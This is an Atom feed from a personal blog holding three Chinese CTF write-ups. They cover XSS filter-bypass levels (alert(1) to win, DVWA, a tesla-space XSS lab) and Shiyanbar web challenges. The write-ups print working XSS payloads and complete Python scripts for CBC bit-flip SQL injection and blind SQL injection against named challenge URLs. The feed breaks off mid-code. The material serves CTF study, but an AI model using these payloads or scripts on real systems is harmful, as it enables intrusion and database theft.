<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s blog</title>
  
  <subtitle>Kage&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-05T12:46:46.847Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>alert(1) to win wp</title>
    <link href="http://yoursite.com/2019/09/05/alert(1)%20to%20win%20wp/"/>
    <id>http://yoursite.com/2019/09/05/alert(1) to win wp/</id>
    <published>2019-09-05T12:46:46.000Z</published>
    <updated>2019-09-05T12:46:46.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Warmup："><a href="#1-Warmup：" class="headerlink" title="1.Warmup："></a>1.Warmup：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将用户输入字符串放入<code>console.log</code>中，可以通过闭合括号和注释，输出alert<br><code>&quot;);alert(1)//</code><br><a href="https://www.runoob.com/js/js-regexp.html" target="_blank" rel="noopener">js正则表达式</a></p><h2 id="2-Adobe："><a href="#2-Adobe：" class="headerlink" title="2.Adobe："></a>2.Adobe：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>&quot;</code>，通过<code>&lt;script&gt;</code>标签闭合<br>js的正则通过<code>//</code>斜杠包裹<br><code>&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p><h2 id="3-JSON："><a href="#3-JSON：" class="headerlink" title="3.JSON："></a>3.JSON：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSON.stringfy函数，意思是将输入的数组或者对象转换为JSON字符串，也可以是字符串，会做相应的过滤<br><a href="https://www.runoob.com/js/js-json.html" target="_blank" rel="noopener">JSON</a><br>上一关payload可以通关<br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="4-Markdown"><a href="#4-Markdown" class="headerlink" title="4.Markdown"></a>4.Markdown</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1：<code>http://[[sb|/onclick=alert(1)&gt;]]</code><br>但不能通过<br>payload2：<code>[[t|http://onerror=alert(1)//]]</code></p><p>思路：payload1思路，外层为a标签，中间引入img标签可以闭合第一个href的双引号，使得我们可以逃逸字符串来控制标签中的内容，插入<code>&gt;</code>闭合a标签，从而触发xss。<br>payload2思路，外层为img标签，中间同样引入a标签闭合alt的双引号，标签中有其他字符串没关系，会被当成标签中没有的属性处理，on事件后有双引号，可以用<code>//</code>杀掉，从而触发xss。</p><p>总结：<br>标签中<code>/</code>：可以替换空格，隔开属性<br><code>//</code>：可以用来杀掉后面的双引号<br>标签不存在的英文，可以不用理会</p><h2 id="5-DOM"><a href="#5-DOM" class="headerlink" title="5.DOM"></a>5.DOM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Slightly too lazy to make two input fields.</span><br><span class="line">  // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">  var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">  // Only slightly contrived at this point.</span><br><span class="line">  var a = document.createElement(&apos;div&apos;);</span><br><span class="line">  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));</span><br><span class="line">  return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户可以任意添加子节点，text节点因为转义无法执行代码，属性节点语法错误不能添加，元素节点只能添加元素无法利用，添加注释节点，通过闭合标签，可以逃出注释执行代码<br><code>Comment#--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">js apply用法</a></p><h2 id="6-Callback"><a href="#6-Callback" class="headerlink" title="6.Callback"></a>6.Callback</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&apos;]*$/.test(thing[0])) return &apos;Invalid callback&apos;;</span><br><span class="line">  var obj = &#123;&apos;userdata&apos;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &apos;\\u003c&apos;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前后两个字符串都没有过滤单引号，可以用单引号包裹，可以逃出json字符串，后面双引号用<code>//</code>杀掉，从而执行代码。<br><code>&#39;#&#39;;alert(1)//</code></p><h2 id="7-Skandia"><a href="#7-Skandia" class="headerlink" title="7.Skandia"></a>7.Skandia</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换为大写，直接alert是无法执行的，js函数是区分大小写的，那么可以把思路转换成通过标签，通过HTML实体编码来绕过，标签中的js代码可以通过实体编码绕过！<br><code>&lt;/script&gt;&lt;img src=1 onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</code><br>简单写了个转换脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = &apos;alert&apos;</span><br><span class="line">for i in s:</span><br><span class="line">print(&apos;&amp;#&apos;+str(ord(i)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-Warmup：&quot;&gt;&lt;a href=&quot;#1-Warmup：&quot; class=&quot;headerlink&quot; title=&quot;1.Warmup：&quot;&gt;&lt;/a&gt;1.Warmup：&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS挑战write up</title>
    <link href="http://yoursite.com/2019/09/05/XSS%E6%8C%91%E6%88%98write%20up/"/>
    <id>http://yoursite.com/2019/09/05/XSS挑战write up/</id>
    <published>2019-09-05T12:45:43.000Z</published>
    <updated>2019-09-05T12:45:43.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、DVWA"><a href="#一、DVWA" class="headerlink" title="一、DVWA"></a>一、DVWA</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p>low：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>medium：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>注意有的要包裹前面的<br>high：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code><br>服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句</p><h3 id="2-stored和reflect"><a href="#2-stored和reflect" class="headerlink" title="2.stored和reflect"></a>2.stored和reflect</h3><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>通关所有</p><h2 id="二、XSS挑战"><a href="#二、XSS挑战" class="headerlink" title="二、XSS挑战"></a>二、XSS挑战</h2><p>level1：<code>http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在外部</p><p>level2：<code>http://xss.tesla-space.com/level1.php?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在属性中</p><p>level3：<code>http://xss.tesla-space.com/level3.php?keyword=&#39; onclick=&#39;alert(1)</code><br>尖括号，双引号都被过滤了，单引号没被过滤，尝试通过单引号闭合并尝试</p><p>level4：<code>http://xss.tesla-space.com/level4.php?keyword=&quot; onclick=&quot;alert(1)</code><br>与level3类似，只是单引号变双引号</p><p>level5：<code>http://xss.tesla-space.com/level5.php?keyword=&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code><br>过滤了on和srcipt，可以通过javascript伪协议弹窗，a的href属性或者iframe的src属性都可以</p><p>level6：<code>http://xss.tesla-space.com/level6.php?keyword=&quot; oNclick=&quot;alert(1)</code><br>大小写绕过对ON的过滤</p><p>level7：<code>http://xss.tesla-space.com/level7.php?keyword=&quot; oonnclick=&quot;alert(1)</code><br>叠加绕过对on的过滤</p><p>level8：<code>http://xss.tesla-space.com/level8.php?keyword=javascrip%26%23x74%3B%3Aalert%28%2fxss%2f%29</code><br>test值出现在a的src属性中，可以通过伪js代码进行xss，过滤了javascript字符串<br>因为是在属性当中，所以可以通过实体编码绕过，如<code>javascrip&amp;#116;:alert(/xss/)</code>在url传输中需要进行url编码<br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">编码网站</a></p><p>level9：<code>http://xss.tesla-space.com/level9.php?keyword=javascrip%26%23116%3Aalert%281%29%2f%2fhttp%3A%2f%2fwww.baidu.com</code><br>与level8类似，多了正则匹配http正确网址，在后面加个<code>//</code>和网址就可以绕过</p><p>level10：<code>http://xss.tesla-space.com/level10.php?keyword=sb&amp;t_link=http://www.baidu.comt&amp;t_history=666&amp;t_sort=&quot; onmouseover=&quot;alert(1)&quot; type=&quot;button</code><br>hidden属性中的xss注入，hidden中的值也要测试，可能过滤不严也会出现xss</p><p>level11：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>referrer属性的值在html中出现，并且过滤不严</p><p>level12：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将数据包中的user-agent放在input属性中。</p><p>level13：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将cookie中的值放在input属性中</p><p>level14：chrome组件exif xss，有点问题没做出来<br>level15：<code>http://xss.tesla-space.com/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code><br>angular js的一点知识，ng-include有包含文件的意思，相当于php的include<br>奇怪的是，我直接访问没法包含，前进后退才成功包含，我也不清楚原因，可以包含同域的第一关页面的xss成功反弹</p><p>level16：<code>http://xss.tesla-space.com/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code><br>过滤了空格和script，可以用img标签，然后用%0a绕过空格</p><p>level17：<code>http://xss.tesla-space.com/level17.php?arg01=.php/sbasdf/wqer/asdf&amp;arg02= onclick=alert(1) style=display:block;height:500px;width:500px;background:blue;</code><br>也是属性内的xss，但是标签显示不出来，插入style属性，将标签转换为block就能点击</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、DVWA&quot;&gt;&lt;a href=&quot;#一、DVWA&quot; class=&quot;headerlink&quot; title=&quot;一、DVWA&quot;&gt;&lt;/a&gt;一、DVWA&lt;/h2&gt;&lt;h3 id=&quot;1-DOM&quot;&gt;&lt;a href=&quot;#1-DOM&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web wp</title>
    <link href="http://yoursite.com/2019/09/05/%E5%AE%9E%E9%AA%8C%E5%90%A7web%20wp/"/>
    <id>http://yoursite.com/2019/09/05/实验吧web wp/</id>
    <published>2019-09-05T11:52:47.000Z</published>
    <updated>2019-09-05T11:52:47.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-简单登录题"><a href="#1-简单登录题" class="headerlink" title="1. 简单登录题"></a>1. 简单登录题</h2><p>考点：CBC翻转字节攻击+sql注入<br>从返回包得到tip：test.php<br>访问得到源码<br>阅读源码，接收id，对id进行过滤，然后将id分配到数组进行序列化加密，把加密后的id数据和iv进行base64编码发送给用户，用户通过加密的id和iv访问页面，后台对id进行解密，无法序列化返回plaintext，能够序列化不检查直接拼接到sql语句库进行查询</p><p>解法：<br>sql注入：limit后的sql注入，可以通过拼接union进行查询，过滤了<code>=</code>，可以用regexp进行绕过，过滤了<code>,</code>，过滤了union，通过cbc进行绕过<br>cbc翻转：解密是从后往前，第一次请求输入2nion，明文为2，可以进行修改，为u进行绕过，但是修改了前一段密文，需要第二次请求，修改iv，将第一段密文修改为可以序列化的字符串。</p><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">payload = &quot;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&quot; + chr(0)</span><br><span class="line">payload = &quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0)</span><br><span class="line">offset = 6 if len(payload)&lt;100 else 7</span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/jiandan/index.php&quot;</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line"></span><br><span class="line">headers = requests.post(url,data=data).headers[&apos;Set-Cookie&apos;]</span><br><span class="line">headers = urllib.parse.unquote(headers)</span><br><span class="line">iv_pattern = re.compile(r&apos;iv=(.+),&apos;)</span><br><span class="line">cipher_pattern = re.compile(r&apos;cipher=(.+)&apos;)</span><br><span class="line">iv = re.findall(iv_pattern,headers)[0]</span><br><span class="line">iv_row = base64.b64decode(iv)</span><br><span class="line">cipher = base64.b64decode(re.findall(cipher_pattern,headers)[0])</span><br><span class="line"></span><br><span class="line">bin_cipher = bytearray(cipher)</span><br><span class="line">bin_cipher[offset] = bin_cipher[offset] ^ ord(&apos;2&apos;) ^ ord(&apos;u&apos;)</span><br><span class="line">cipher_new = urllib.parse.quote(base64.b64encode(bytes(bin_cipher)))</span><br><span class="line">cookies = &#123;</span><br><span class="line">&quot;iv&quot;:iv,</span><br><span class="line">&quot;cipher&quot;:cipher_new</span><br><span class="line">&#125;</span><br><span class="line">html = requests.get(url,cookies=cookies).text</span><br><span class="line"></span><br><span class="line">wrong = base64.b64decode(re.findall(r&apos;\(\&apos;(.*)\&apos;\)&apos;,html)[0])</span><br><span class="line">iv_new = &apos;&apos;</span><br><span class="line">plaintext = &quot;a:1:&#123;s:2:\&quot;id\&quot;;s:&quot;</span><br><span class="line"></span><br><span class="line">bin_iv = bytearray(iv_row)</span><br><span class="line">for i in range(len(plaintext)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ wrong[i] ^ ord(plaintext[i])</span><br><span class="line"></span><br><span class="line">iv_new = urllib.parse.quote(base64.b64encode(bytes(bin_iv)))</span><br><span class="line">cookies = &#123;</span><br><span class="line">&quot;iv&quot; : iv_new,</span><br><span class="line">&quot;cipher&quot; : cipher_new</span><br><span class="line">&#125;</span><br><span class="line">result = requests.get(url,cookies = cookies).text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></p><h2 id="2-认真一点"><a href="#2-认真一点" class="headerlink" title="2. 认真一点"></a>2. 认真一点</h2><p>考点：SQL盲注<br>sql语句的弱类型：<br>select <em> from users where id=’1’ 与<br>select </em> from users where id=’1kage’能返回一样的值<br>用burp爆破，waf没有过滤了or，单引号，可以进行盲注<br>过滤了<code>^</code>可以用<code>$</code>从后面进行盲注<br>len被过滤，可以用<code>length</code>进行代替<br>python中post传输数据%xx要用0x来代替</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def my_replace(s):</span><br><span class="line">return s.replace(&apos; &apos;,chr(0x0a)).replace(&apos;or&apos;,&apos;oorr&apos;)</span><br><span class="line"></span><br><span class="line">url = r&apos;http://ctf5.shiyanbar.com/web/earnest/index.php&apos;</span><br><span class="line"># 0&apos; or 1 or &apos;kage&apos;=&apos;</span><br><span class="line">True_state = &apos;You are in&apos;</span><br><span class="line">model = &quot;0&apos; or %s or &apos;kage&apos;=&apos;&quot;</span><br><span class="line">column = &quot;database()&quot;</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_length(column):</span><br><span class="line">model_len = &quot;(select length(%s)=%%d)&quot; % column</span><br><span class="line">t = 1</span><br><span class="line">while True:</span><br><span class="line">payload_len = model_len % t</span><br><span class="line">payload = my_replace(model % payload_len)</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">print(&quot;[+]length(%s): %d&quot; % (column,t))</span><br><span class="line">return t</span><br><span class="line">t += 1</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_data(column,len):</span><br><span class="line">model_data = &quot;(select %s regexp &apos;%%s$&apos;)&quot; % column</span><br><span class="line">cset = string.digits+string.ascii_lowercase+&apos;!_&#123;&#125;@~.&apos;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(len):</span><br><span class="line">for c in cset:</span><br><span class="line">payload_data = model_data % (c + result)</span><br><span class="line">payload = my_replace(model % payload_data)</span><br><span class="line">data = &#123;&apos;id&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">result = c + result</span><br><span class="line">print(result)</span><br><span class="line">break</span><br><span class="line">pass</span><br><span class="line">print(&quot;[+]column: %s&quot; % result)</span><br><span class="line"></span><br><span class="line">def get_data(column):</span><br><span class="line">return my_data(column,my_length(column))</span><br><span class="line"></span><br><span class="line"># get_data(&quot;database()&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema=database() limit 1)&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name=&apos;fiag&apos; limit 1)&quot;)</span><br><span class="line">get_data(&quot;(select fl$4g from fiag limit 1)&quot;)</span><br></pre></td></tr></table></figure><h2 id="3-后台登录"><a href="#3-后台登录" class="headerlink" title="3. 后台登录"></a>3. 后台登录</h2><p>考点：MD5弱类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">    $sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">    $result=mysqli_query($link,$sql);</span><br><span class="line">        if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">            echo &apos;flag is :&apos;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &apos;密码错误!&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>md5函数，第二个参数为true会将16进制字符串解析成字符串从而形成注入<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">string: T0Do#&apos;or&apos;8</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">string: &apos;or&apos;6]!r,b</span><br></pre></td></tr></table></figure></p><p><img src="/img/1566054085195.png" alt=""></p><h2 id="5-加了料的报错注入"><a href="#5-加了料的报错注入" class="headerlink" title="5. 加了料的报错注入"></a>5. 加了料的报错注入</h2><p>考点：sql盲注</p><h3 id="（1）布尔盲注解题"><a href="#（1）布尔盲注解题" class="headerlink" title="（1）布尔盲注解题"></a>（1）布尔盲注解题</h3><p>查看源码，给了我们后台sql语句<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code><br>我最初尝试通过布尔盲注进行解题，因为是post类型，不断尝试用or进行登录，最终成功登录，写脚本布尔盲注。因为过滤了<code>=</code>,我通过<code>regexp &#39;^$&#39;</code>进行绕过，过滤了<code>limit</code>可以使用<code>group_concat</code>。<br>脚本（改自第三题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = r&apos;http://ctf5.shiyanbar.com/web/baocuo/index.php&apos;</span><br><span class="line"># 0&apos; or 1 or &apos;kage&apos;=&apos;</span><br><span class="line">True_state = &apos;You are our member, welcome to enter&apos;</span><br><span class="line">model = &quot;1&apos; or %s or &apos;0&quot;</span><br><span class="line">column = &quot;database()&quot;</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_length(column):</span><br><span class="line">model_len = &quot;(select length(%s) regexp &apos;^%%d$&apos;)&quot; % column</span><br><span class="line">t = 1</span><br><span class="line">while True:</span><br><span class="line">payload_len = model_len % t</span><br><span class="line">payload = model % payload_len</span><br><span class="line">print(payload)</span><br><span class="line">data = &#123;&apos;username&apos;:&apos;admin&apos;,&apos;password&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">print(&quot;[+]length(%s): %d&quot; % (column,t))</span><br><span class="line">return t</span><br><span class="line">t += 1</span><br><span class="line"></span><br><span class="line"># column = database()</span><br><span class="line">def my_data(column,len):</span><br><span class="line">model_data = &quot;(select %s regexp &apos;%%s$&apos;)&quot; % column</span><br><span class="line">cset = string.digits+string.ascii_lowercase+&apos;!_&#123;&#125;@~.&apos;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(len):</span><br><span class="line">for c in cset:</span><br><span class="line">payload_data = model_data % (c + result)</span><br><span class="line">payload = model % payload_data</span><br><span class="line">data = &#123;&apos;username&apos;:&apos;admin&apos;,&apos;password&apos;:payload&#125;</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">if True_state in html:</span><br><span class="line">result = c + result</span><br><span class="line">print(result)</span><br><span class="line">break</span><br><span class="line">pass</span><br><span class="line">print(&quot;[+]column: %s&quot; % result)</span><br><span class="line"></span><br><span class="line">def get_data(column):</span><br><span class="line">return my_data(column,my_length(column))</span><br><span class="line"></span><br><span class="line"># get_data(&quot;database()&quot;)</span><br><span class="line"># get_data(&quot;(select group_concat(table_name separator &apos;@&apos;) from information_schema.tables where table_schema regexp database())&quot;)</span><br><span class="line">get_data(&quot;(select group_concat(column_name separator &apos;@&apos;) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;)&quot;)</span><br><span class="line"># get_data(&quot;database()&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="（2）报错解题"><a href="#（2）报错解题" class="headerlink" title="（2）报错解题"></a>（2）报错解题</h3><p>因为题目会报错，但是waf过滤了<code>=</code>,<code>rand</code>,<code>floor</code>，所以无法通过<code>substr</code>报错<br>那么我们可以通过xpath报错<br>通过fuzz可以知道username对括号进行过滤，但是没对函数过滤，而password则相反，可以配合<code>/**/</code>进行报错注入</p><p>payload：<code>username=1&#39; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) and &#39;1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 